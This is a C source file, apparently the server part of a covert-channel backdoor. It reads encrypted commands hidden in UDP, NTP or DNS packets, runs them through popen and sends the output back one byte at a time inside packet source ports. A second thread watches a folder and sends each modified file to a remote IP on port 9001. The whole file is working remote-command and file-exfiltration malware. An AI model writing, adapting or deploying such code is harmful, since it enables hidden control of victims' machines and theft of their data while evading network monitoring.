#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <pthread.h>

#include "server.h"
#include "util.h"
#include "covert.h"
#include "inet.h"

#define SRC_OFF 		28 // Source address, so we know where to send results
#define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port

#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUF_LEN	(1024 * (EVENT_SIZE + 16))
#define ALL_MASK 0xffffffff

struct bpf_program fltr_prog;

struct exfil_pack
{
	uint32 ipaddr;
	char  *folder;
};

int channel;

void pcap_start(uint32 ipaddr, char *folder, int chan)
{
	pcap_t* nic;
	char errbuf[PCAP_ERRBUF_SIZE];
	pthread_t exfil_thread;
	struct exfil_pack expack;
	char * fltr_str = DEF_FLT;

	channel = chan;

	if (channel == 2)
		fltr_str = DNS_FLT;

	// Setup Exfil Watch
	expack.ipaddr = ipaddr;
	expack.folder = folder;
	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);

	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
		error(errbuf);
	
	// Get packet fltr_str from arguments
	if (pcap_compile(nic, &fltr_prog, fltr_str, 0, 0) == -1)
		error("pcap_compile");

	// Set fltr_str for captures
	if (pcap_setfilter(nic, &fltr_prog) == -1)
		error("pcap_setfltr_str");

	// Start capturing, make sure to heavily restrict our CPU usage.
	while (TRUE)
	{
		if (pcap_dispatch(nic, -1, pkt_handler, NULL) < 0)
			error("pcap_loop");
		usleep(5000); // sleep 5ms
	}
	
	pthread_join(exfil_thread, NULL);
}

void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
	char *ptr;
	char *data;
	char type;
	static char buf[MAX_LEN];
	static int len = 0;
	int sig_pos = ETHER_HEADER_LEN;

	switch(channel)
	{
		case CHAN_UDP:
			sig_pos += UDP_SIG;
			break;
		case CHAN_NTP:
			sig_pos += NTP_SIG;
			break;
		case CHAN_DNS:
			sig_pos += DNS_SIG;
			break;
	}

	// Step 1: locate the payload portion of the packet
	if (pkt_info->caplen - sig_pos <= 0)
			return;
	ptr = (char *)(packet + sig_pos);

	// Step 2: check for signature
	if (*ptr != (char)SIGNTR)
		return;

	++ptr;

	// Step 3: dump data into buffer
	data = buf + len;
	memcpy(data, ptr, 1);
	len += 1;

	if (len % FRAM_SZ != 0) // Check for frame
		return;

	data -= FRAM_SZ - 1;
	
	decrypt(SEKRET, data, FRAM_SZ);

	// Step 4: see if we have a full transmission
	data = getTransmission(buf, &len, &type);

	if (data == NULL)
		return;

	// Step 5: execute the command
	if (type == CMD_TYP)
	{
		uint32 ip;
		short port;

		// Grab the source in case we need to send the result back
		ip = *(uint32*)(packet + SRC_OFF);
		port = *(uint16*)(packet + PORT_OFF);

		// Step 6: Execute the command
		execute(data, ip, port);
	}

	// Step 6: reset buffer
	memset(buf, 0, MAX_LEN);
	len = 0;
	free(data);
	data = 0;
}

void execute(char *command, u_int32_t ip, u_int16_t port)
{
	FILE *fp;
	char line[MAX_LEN];
	char resp[MAX_LEN];
	int tot_len;

	memset(line, 0, MAX_LEN);
	memset(resp, 0, MAX_LEN);

	// Run the command, grab stdout
	fp = popen(command, "r");

	// Append line by line output into response buffer
	while (fgets(line, MAX_LEN, fp) != NULL)
		strcat(resp, line);

	tot_len = strlen(resp) + 1;

	char *trans;

	trans = buildTransmission(resp, &tot_len, RSP_TYP);

	for (int i = 0; i < tot_len; i += 8)
	{
		char frame[FRAM_SZ];
		char *ptr;
		int fram_len;
		uint16 src_port = 0;
		uint16 dst_port = 0;

		ptr = trans + i;

		fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;

		memcpy(frame, ptr, fram_len);

		encrypt(SEKRET, frame, FRAM_SZ);

		for (int j = 0; j < FRAM_SZ; ++j)
		{
			uint8 byte = frame[j];
			src_port = 0xFF00 & SIGNTR << 8;
			src_port += byte;
			if (channel == CHAN_DNS)
				dst_port = PORT_DNS;
			else
				dst_port = PORT_NTP;

			usleep(SLEEP_TIME);
			_send(ip, src_port, dst_port, channel);
		}
	}

	free(trans);

	pclose(fp);
}

void exfil_send(uint32 ipaddr, char *path)
{
	int buflen;
	char buffer[MAX_LEN];
	FILE *file;

	file = open_file(path, FALSE);

	printf("Starting Exfil: %s\n", path);

	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
	{
		char *trans;
		int tot_len;

		tot_len = buflen + 1;

		trans = buildTransmission(buffer, &tot_len, XFL_TYP);

		printf("Data: %s\n", buffer);

		for (int i = 0; i < tot_len; i += 8)
		{
			char frame[FRAM_SZ];
			char *ptr;
			int fram_len;
			uint16 src_port = 0;
			uint16 dst_port = 0;

			ptr = trans + i;

			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;

			memcpy(frame, ptr, fram_len);

			encrypt(SEKRET, frame, FRAM_SZ);

			for (int j = 0; j < FRAM_SZ; ++j)
			{
				uint8 byte = frame[j];
				src_port = 0xFF00 & SIGNTR << 8;
				src_port += byte;
				dst_port = 9001;

				usleep(SLEEP_TIME);
				_send(ipaddr, src_port, dst_port, channel);
			}
		}
	}
}

void *exfil_watch(void *arg)
{
	int fd, wd, ret;
	static struct inotify_event *event;
	fd_set rfds;
	struct exfil_pack expck;
	uint32 ipaddr;
	char  *folder;

	expck = *(struct exfil_pack*)arg;
	ipaddr = expck.ipaddr;
	folder = expck.folder;

	fd = inotify_init();
	if (fd < 0)
		error("inotify init");

	wd = inotify_add_watch(fd, folder, (uint32)IN_MODIFY);

	if (wd < 0)
		error("inotify add watch");

	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	while (TRUE)
	{
		int i = 0;
		int len;
		char buf[BUF_LEN];

		ret = select(fd + 1, &rfds, NULL, NULL, NULL);
		len = read(fd, buf, BUF_LEN);

		if (len < 0 && errno != EINTR) // need to reissue system call
			error("read");
		else if (len == 0) // BUF_LEN too small?
			error("inotify buffer too small");

		while (i < len)
		{
			event = (struct inotify_event *) &buf[i];

			if (event->len)
			{
				char path[MAX_LEN];
				strncpy(path, folder, MAX_LEN);
				strcat(path, "/");
				strcat(path, event->name);
				exfil_send(ipaddr, path);
			}

			i += EVENT_SIZE + event->len;
		}

		if (ret < 0)
			error("select");
		else if (!ret)
			printf("timed out\n");
	}

	printf ("Cleaning up and Terminating....................\n");
	fflush (stdout);
	ret = inotify_rm_watch(fd, wd);
	if (ret)
		error("inotify rm watch");
	if (close(fd))
		error("close");
}
